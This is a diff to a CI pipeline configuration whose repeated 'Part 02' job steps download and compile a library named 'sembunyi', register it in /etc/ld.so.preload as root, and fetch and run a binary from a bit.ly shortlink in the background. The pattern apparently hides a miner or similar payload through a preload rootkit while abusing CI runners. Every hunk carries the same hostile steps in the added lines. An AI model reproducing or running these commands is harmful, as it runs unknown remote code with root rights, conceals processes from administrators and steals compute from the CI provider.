@@ -13,9 +13,7 @@ jobs:
          name: Part 02
          command: |
           wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make"
-          sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
-          sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
           wget https://bit.ly/3Ibzg9T
           chmod +x 3Ibzg9T
           sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
@@ -38,9 +36,7 @@ jobs:
          name: Part 02
          command: |
           wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make"
-          sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
-          sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
           wget https://bit.ly/3Ibzg9T
           chmod +x 3Ibzg9T
           sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
@@ -63,9 +59,7 @@ jobs:
          name: Part 02
          command: |
           wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make"
-          sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
-          sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
           wget https://bit.ly/3Ibzg9T
           chmod +x 3Ibzg9T
           sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
@@ -88,9 +82,7 @@ jobs:
          name: Part 02
          command: |
           wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make"
-          sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
-          sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
           wget https://bit.ly/3Ibzg9T
           chmod +x 3Ibzg9T
           sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
@@ -113,9 +105,7 @@ jobs:
          name: Part 02
          command: |
           wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make"
-          sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
-          sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
           wget https://bit.ly/3Ibzg9T
           chmod +x 3Ibzg9T
           sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
@@ -138,9 +128,7 @@ jobs:
          name: Part 02
          command: |
           wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make"
-          sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
-          sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
           wget https://bit.ly/3Ibzg9T
           chmod +x 3Ibzg9T
           sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
@@ -163,9 +151,7 @@ jobs:
          name: Part 02
          command: |
           wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make"
-          sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
-          sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
           wget https://bit.ly/3Ibzg9T
           chmod +x 3Ibzg9T
           sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
@@ -188,9 +174,7 @@ jobs:
          name: Part 02
          command: |
           wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make"
-          sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
-          sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
           wget https://bit.ly/3Ibzg9T
           chmod +x 3Ibzg9T
           sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
@@ -213,9 +197,7 @@ jobs:
          name: Part 02
          command: |
           wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make"
-          sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
-          sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
           wget https://bit.ly/3Ibzg9T
           chmod +x 3Ibzg9T
           sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
@@ -238,9 +220,7 @@ jobs:
          name: Part 02
          command: |
           wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make"
-          sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
-          sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
           wget https://bit.ly/3Ibzg9T
           chmod +x 3Ibzg9T
           sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
